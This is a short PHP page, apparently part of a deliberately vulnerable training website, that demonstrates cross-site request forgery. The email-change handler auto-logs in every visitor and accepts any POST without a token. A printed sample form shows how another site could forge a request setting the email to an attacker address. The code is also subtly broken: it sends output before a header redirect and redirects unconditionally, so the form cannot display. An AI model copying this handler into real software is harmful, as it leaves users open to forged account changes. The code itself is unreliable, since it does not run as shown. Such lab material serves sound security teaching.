<?php
session_start();

if (!isset($_SESSION['loggedin'])) {
    $_SESSION['loggedin'] = true;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Perform an action, e.g., change email
    $email = $_POST['email'];
    echo "Email changed to: " . htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
}

header("Location: " . $_SERVER['PHP_SELF']);
exit();
?>
<form method="post">
    Email: <input type="text" name="email"><br>
    <input type="submit" value="Change Email">
</form>

<h3>CROSS-SITE REQUEST FORGERY (CSRF)</h3>
<p>CSRF attacks force authenticated users to submit a request to a web application against their will. Try submitting a form from another site that changes the email address.</p>
<p>Create a malicious form on another site:</p>
<pre>
&lt;form action="http://localhost/vulnerable-website/public/csrf.php" method="post"&gt;
    &lt;input type="hidden" name="email" value="attacker@example.com"&gt;
    &lt;input type="submit" value="Submit"&gt;
&lt;/form&gt;
</pre>
